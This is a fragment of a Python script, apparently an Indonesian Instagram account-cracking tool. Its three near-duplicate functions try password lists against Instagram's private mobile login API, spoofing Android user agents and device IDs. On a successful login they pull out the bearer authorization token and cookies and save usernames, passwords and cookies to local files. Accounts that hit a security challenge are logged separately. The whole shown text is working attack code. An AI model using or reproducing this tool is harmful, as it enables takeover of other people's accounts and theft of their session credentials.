33.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
	igve=igv.split(",")
	versi=random.choice(igve)
	uas1 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; TCL; 5087Z; Doha_TMO; mt6762; {language}; {kode})"
	uas2 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; Xiaomi; M2007J3SG; apollo; qcom; {language}; {kode})"
	uas3 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; Google/google; Pixel 7 Pro; cheetah; cheetah; {language}; {kode})"
	uas4 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; HTC/htc; 2PQ93; htc_hiaewhl; htc_hiae; {language})"
	baseReturn = random.choice([uas1, uas2, uas3])
	return baseReturn

def Crack_api(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V1 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_i(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V2 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_N(username, memek):
	global Ok, Cp, Loop
#	sys.stdout.write(f"\r{P}[{H}RIDWAN-DEV{P}] [ {Loop}/{str(len(Uuid))}{P} ] [ {P}CP:{M}{cp} {P}OK:{H}{ok}"),
	sys.stdout.write(f"\r{biru}|─{b}➤ {puti}CRACK V4 {b}{Loop}{P} : {H}{str(len(Uuid))}{P}{P}/Ok:-{H}{Ok}{P}/Cp:-{biru}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {b}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {b}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {b}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {b}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {b}{meng}")
				print(f"{biru}|─{b}➤{puti} POSTINGAN {b}{post}")
				print(f"{biru}|─{b}➤{puti} FACEBOOK {b}{fbid}")
				print(f"{biru}|─{b}➤{puti} KUKI {b}{ig_set_authorization}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('buatpush.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f'{B}╭────────────────────────────────────────────────────────────────────────────{b}▶')
				print(f"\r{biru}|─{b}➤{puti} FULL NAME {biru}{fullname[:10]}")
				print(f"{biru}|─{b}➤{puti} USERNAME {biru}{username}")
				print(f"{biru}|─{b}➤{puti} PASSWORD {biru}{password}")
				print(f"{biru}|─{b}➤{puti} PENGIKUT {biru}{peng}")
				print(f"{biru}|─{b}➤{puti} MENGIKUTI {biru}{meng}")
				print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
				open('/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

Crack_N

if __name__ == '__main__':
	try:os.mkdir('/sdcard/Ress')
	except:pass
	try:os.mkdir('Data')
	except:pass
	try:
		Menu()#security() 
	except requests.exceptions.ConnectionError:
		print('Connection Close')
	

